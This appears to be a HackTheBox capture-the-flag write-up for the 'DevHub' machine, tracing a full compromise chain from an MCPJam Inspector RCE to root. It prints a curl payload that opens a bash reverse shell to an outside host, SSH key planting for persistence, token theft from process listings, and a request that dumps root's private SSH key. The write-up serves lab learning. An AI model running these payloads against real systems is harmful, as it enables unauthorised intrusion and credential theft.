# HackTheBox DevHub Full Chain Penetration Testing

## External Reconnaissance and Web Entry
- Network Mapping:
	- `nmap` scan of `10.129.18.105` indentified host as `devhub.htb`
 	- `nmap` scan of `10.129.18.105` indentified open ports: 22, 88, 6274
  
# Web reconnaissance
- Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector v1.4.2 on `http://devhub.htb:6274`
- CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
- Payload Delivery: Utilizing curl to inject a malicious JSON configuration into the /api/mcp/connect endpoint.

## Reverse shell
		curl http://devhub.htb:6274/api/mcp/connect \
  	-H "Content-Type: application/json" \
  	-d '{
  		"serverConfig": {
  			"command":"/bin/bash",
  			"args":["-c", "bash -i >& /dev/tcp/10.10.14.126/4444 0>&1"],
  			"env":{}
  		},
  		"serverId":"rev_shell"
  	}'
			
- Establishing a callback to `10.10.14.126:4444` via bash interactive shell.
- Gaining access to `mcp-dev` user with `uid:1001` 
  
## Persistence and Stabilization
- SSH Key Injection: Generating and hosting a public RSA key via a local HTTP server.
- Credential Placement: Deploying the public key into the target user’s `.ssh/authorized_keys` directory.
- Stable Connection: Establishing a persistent SSH session to replace the volatile reverse shell.

## Lateral movement and system enumeration
- File enumeration: `cat /etc/passwd` revealed other user: `analyst` with `uid:1002`
- Socket scan: `ss -tulpn` revealed open port `8888` on `127.0.0.1`, the exact same port was shown on `http://devhub.htb`
- SSH forwarding: `ssh -i mcp-dev@devhub.htb -L 4444:127.0.0.1:8888` creating port forwarding to access hidden jupyter panel on `127.0.0.1:8888` 
- Process scan: `ps aux | grep jupyter` shown process with hardcoded `--ServerApp.token`, leading to token compromise

## Privilege escalation (`mcp-dev` -> `analyst`)
- Token usage: Extracted token was used to gain controll over jupyter panel, leading to `analyst` compromise
- Credential Placement: Deploying the public key into the `analyst/.ssh/authorized_keys` directory via `wget` and previously prepared `http` server.
- Stable Connection: Establishing a persistent key-based SSH connection
- `/home/analyst/user.txt` extraction

## Priviledge escalation (`analyst` -> `root`)
- process and files examination:
    - `ps aux |grep /opt` revealed process owned by `root`
      
 	 	`root        1056  0.0  0.7 111108 28880 ?        Ss   18:29   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py`

    - `ls -l /opt/opsmcp/server.py `
      
     	 `-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py`

- file examination: `server.py` contained
  	- `VALID_API_KEY = "opsmcp_secret_key_4fXXXXXXXXXXXXXX"`
  	-  Hidden endpoints `ops._admin_dump`, `ops._debug_mode` that weren't in the visible tool list
  	-  The `ops._admin_dump` handler could read `/root/.ssh/id_rsa`
 
- exploitation:

		curl -s http://127.0.0.1:5000/tools/call \
		  -H "X-API-Key: opsmcp_secret_key_4fXXXXXXXXXXXXXX" \
		  -H "Content-Type: application/json" \
		  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

  request returned `root`'s private ssh key, leading to full system compromise.
- connecting via ssh using dumped key: `ssh -i key root@devhub.htb`
- `/root/root.txt` extraction
